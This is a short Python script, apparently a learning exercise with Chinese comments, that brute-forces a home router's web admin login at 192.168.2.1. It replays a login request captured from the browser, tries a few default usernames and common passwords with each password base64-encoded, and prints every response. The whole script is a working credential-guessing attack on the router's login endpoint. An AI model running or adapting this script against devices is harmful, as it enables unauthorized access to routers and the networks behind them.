#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
import base64
import json

# 浏览器抓包得 chrome f12
# 结果如图 https://github.com/mengyyy/learn_python/blob/master/image_2018-02-01_16-49-24.png
# 网页请求地址
loginUrl = 'http://192.168.2.1/cgi-bin/'
# 网页请求发送数据 含用户名密码
data = {
    "method":"set",
    "module":
    {
        "security":
        {
            "login":
            {
                "username":"admin",
                "password":"YWRtaW4="
            }
        }
    },
    "_deviceType":"pc"
}
# 网页请求头部
headers = {
    'Content-Type':'application/json',
    'Host':'192.168.2.1',
    'Origin':'http://192.168.2.1',
    'Referer':'http://192.168.2.1/cgi-bin',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'
}

# 用户名表
username = ['root','admin']
# 密码表
password = ['123456', 'root', 'admin', 'rootroot']

for u in username:
    for p in password:
        # 修改请求数据中的用户名
        data['module']['security']['login']['username'] = u
        # 密码不能直接发送 需要进行base64编码
        data['module']['security']['login']['password'] = base64.b64encode(p.encode('utf-8')).decode('utf-8')
        # 浏览器抓包得 发送请求方式和格式
        req = requests.post(loginUrl, data=json.dumps(data), headers=headers)
        # 打印结果
        print(u, p, req.json(), sep=' | ')
